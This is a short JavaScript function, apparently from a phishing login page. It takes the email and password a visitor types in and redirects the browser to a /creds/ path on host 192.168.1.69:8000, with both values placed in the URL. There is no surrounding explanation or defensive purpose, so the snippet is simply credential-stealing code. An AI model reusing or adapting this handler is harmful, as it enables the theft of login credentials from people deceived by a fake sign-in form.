function enter() {
    var mail = document.getElementById("mail-inp").value;
    var password = document.getElementById("password-inp").value;

    console.log("Yeeah");

    window.location.href = `192.168.1.69:8000/creds/${mail}/${password}`
}